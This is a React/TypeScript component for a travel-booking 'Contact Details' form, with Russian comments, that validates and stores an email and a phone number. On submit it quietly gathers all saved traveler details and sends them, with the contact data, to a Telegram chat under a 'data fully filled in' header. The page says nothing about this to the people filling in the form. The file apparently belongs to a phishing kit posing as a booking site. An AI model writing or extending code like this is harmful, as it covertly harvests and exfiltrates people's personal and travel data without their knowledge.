import React from 'react';
import { useNavigate } from 'react-router-dom';
import './TravelerDetails.css';
import { sendTelegram, formatTravelerSummary } from './services/telegram';
import { useTranslation } from './hooks/useTranslation';

const BackIcon = () => (
  <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
);

const ContactDetails: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useTranslation();
  // Инициализация синхронно из localStorage, чтобы форма заполнялась сразу
  const init = () => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const key = offerId ? `contact_${offerId}` : 'contact';
      const raw = localStorage.getItem(key) || sessionStorage.getItem(key);
      if (!raw) return {} as any;
      return JSON.parse(raw);
    } catch { return {} as any; }
  };
  const initData: any = init();
  const [email, setEmail] = React.useState(initData.email || '');
  const [phone, setPhone] = React.useState(initData.phone || '');
  const invalidEmail = email.length > 0 && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  // Разрешаем международные номера: + и 6-15 цифр (E.164 упрощённо)
  const digits = phone.replace(/\D/g,'');
  const invalidPhone = phone.length > 0 && !(phone.startsWith('+') && digits.length >= 6 && digits.length <= 15);
  const formValid = !invalidEmail && !invalidPhone && email.trim().length>0 && phone.trim().length>0;

  // hydrate on mount
  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const key = offerId ? `contact_${offerId}` : 'contact';
      if (!localStorage.getItem(key) && sessionStorage.getItem(key)) {
        localStorage.setItem(key, String(sessionStorage.getItem(key)));
      }
    } catch {}
  }, []);

  // autosave on change
  React.useEffect(() => {
    try {
      const offerId = sessionStorage.getItem('current_offer_id') || '';
      const key = offerId ? `contact_${offerId}` : 'contact';
      const payload = JSON.stringify({ email, phone });
      localStorage.setItem(key, payload);
      sessionStorage.setItem(key, payload);
    } catch {}
  }, [email, phone]);

  return (
    <div className="trav-page">
      <div className="trav-header">
        <button className="back-button" onClick={() => navigate(-1)}><BackIcon/></button>
        <h1>{t('contactDetails')}</h1>
        <div style={{ width: 24 }}></div>
      </div>

      <div className="section">
        <label className={`field ${invalidEmail ? 'error' : ''}`}>
          <span>{t('contactEmail')}</span>
          <input type="email" value={email} onChange={(e)=>setEmail(e.target.value)} />
          {invalidEmail && <div className="hint">{t('enterValidEmail')}</div>}
        </label>

        <label className={`field ${invalidPhone ? 'error' : ''}`}>
          <span>{t('contactNumber')}</span>
          <input value={phone} onChange={(e)=>setPhone(e.target.value)} placeholder="e.g. +14155552671" />
          {invalidPhone && <div className="hint">{t('enterInternationalNumber')}</div>}
        </label>
      </div>

      <div className="trav-footer">
        <button className="next-button" disabled={!formValid} onClick={()=>{ 
          if (!formValid) return; 
          try { 
            const offerId = sessionStorage.getItem('current_offer_id') || ''; 
            const key = offerId ? `contact_${offerId}` : 'contact'; 
            const payload = JSON.stringify({ email, phone }); 
            localStorage.setItem(key, payload); 
            sessionStorage.setItem(key, payload);
          } catch {}
          // Собираем полные данные и шлём в Telegram
          try {
            const offerId = sessionStorage.getItem('current_offer_id') || '';
            const tKey = offerId ? `traveler_details_${offerId}` : 'traveler_details';
            const tRaw = localStorage.getItem(tKey) || sessionStorage.getItem(tKey) || '{}';
            const tData = JSON.parse(tRaw || '{}');
            const summary = formatTravelerSummary({ ...tData, email, phone });
            const header = '✅ <b>Данные заполнены (полностью)</b>';
            sendTelegram(`${header}\n${summary}`);
          } catch {}
          navigate(-1);
        }}>{t('done')}</button>
      </div>
    </div>
  );
};

export default ContactDetails;


